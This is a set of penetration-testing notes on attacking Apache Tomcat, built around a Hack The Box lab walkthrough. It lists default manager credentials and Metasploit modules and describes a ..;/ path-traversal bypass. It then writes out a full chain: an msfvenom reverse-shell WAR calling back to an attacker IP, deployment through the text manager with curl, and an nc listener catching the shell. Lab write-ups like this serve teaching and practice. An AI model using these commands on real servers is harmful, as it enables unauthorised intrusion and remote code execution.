# Tomcat

### Tomcat Version Enumeration&#x20;

```
└─$ curl -s http://megahosting.htb:8080/docs/ | grep Tomcat
<title>Apache Tomcat 9 (9.0.31)
```

### Credential Locations

* Creds will be in one of these locations, wont be in both locations&#x20;

```
/usr/share/tomcat9/etc/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml
```

### Username Enum

In some versions prior to Tomcat6 you could enumerate users:

```bash
msf> use auxiliary/scanner/http/tomcat_enum
```

### Default credentials

The most interesting path of Tomcat is _**/manager/html**_, inside that **path you can upload and deploy war files** (execute code). But this path is protected by basic HTTP auth, the most common credentials are:

* admin:admin
* tomcat:tomcat
* admin:\<NOTHING>
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

You could test these and more using:

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

### Password backtrace disclosure

Try to access `/auth.jsp` and if you are very lucky it **might disclose the password in a backtrace**.

### Path Traversal (..;/)

In some [**vulnerable configurations of Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) you can gain access to protected directories in Tomcat using the path: `/..;/`

So, for example, you might be able to **access the Tomcat manager** page by accessing: `www.vulnerable.com/lalala/..;/manager/html`

**Another way** to bypass protected paths using this trick is to access `http://www.vulnerable.com/;param=value/manager/html`

### Understanding your role once you have credentials&#x20;

> NOTE: For security reasons, using the manager webapp is restricted to users with role “manager-gui”. The host-manager webapp is restricted to users with role “admin-gui”. Users are defined in `/etc/tomcat9/tomcat-users.xml`.

The user tomcat has `admin-gui`, but not `manager-gui`, which means I can’t access the manager webapp:

<figure><img src="https://0xdfimages.gitlab.io/img/image-20200622204040089.png" alt=""><figcaption></figcaption></figure>

But I can access the host-manager webapp:

<figure><img src="https://0xdfimages.gitlab.io/img/image-20200622204142330.png" alt=""><figcaption></figcaption></figure>

### Text-based manager <a href="#text-based-manager" id="text-based-manager"></a>

* The tomcat user did have another permission, `manager-script`. This is to allow access to the text-based web service located at `/manager/text`. There’s a list of commands [here](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported\_Manager\_Commands).
* I can test it out with `list` and it works:

```
root@kali# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

Now that I have access to the manager (even if not through the GUI)

### Deploy Malicious War <a href="#deploy-malicious-war" id="deploy-malicious-war"></a>

**Generate Payload**

With access to Tomcat Manager, I can proceed the with a malicious `.war` upload just like in [Jerry](https://0xdf.gitlab.io/2018/11/17/htb-jerry.html#exploiting-tomcat), but here I’ll use the text-based manager application to deploy it. I’ll generate a payload with `msfvenom` to get a simple reverse shell:

```
root@kali# msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=443 -f war -o rev.10.10.14.18-443.war
Payload size: 13398 bytes
Final size of war file: 13398 bytes
Saved as: rev.10.10.14.18-443.war
```

**Upload Payload**

Now I’ll use `curl` to send the payload. I’ll need to give it the application path (url), and send the payload using an HTTP PUT request. In `curl`, I’ll use `-T` or `--upload-file` to signify a PUT request:

> ```
>    -T, --upload-file <file>
>           This transfers the specified local file to the remote URL. If there is no file part in the specified URL, curl will append the local file name.  NOTE  that  you
>           must  use  a  trailing / on the last directory to really prove to Curl that there is no file name or curl will think that your last directory name is the remote
>           file name to use. That will most likely cause the upload operation to fail. If this is used on an HTTP(S) server, the PUT command will be used.
> ```

I’ll deploy the payload with:

```
root@kali# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/0xdf --upload-file rev.10.10.14.18-443.war 
OK - Deployed application at context path [/0xdf]
```

That’s:

* `-u 'tomcat:$3cureP4s5w0rd123!'` - the creds
* `/manager/text/deploy` - text-based path for `deploy` command
* `?path=/0xdf` - the path I want the application to live at
* `--upload-file rev.10.10.14.18-443.war` - war file to upload with HTTP PUT

The results suggest it worked. I’ll start `nc`, and then trigger it with `curl http://10.10.10.194:8080/0xdf`. I get a connection back with a shell:

```
root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.194.
Ncat: Connection from 10.10.10.194:37000.
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

### Easy Pwns&#x20;

#### Apache Tomcat Metasploit

* **Version**: Apache Tomcat/8.0.47
* **OS**: Microsoft Windows 2008| Vista | 7
* **exploit**: multi/http/struts2\_rest\_xstream
* **Targeturi**: /struts2-rest-showcase/orders/
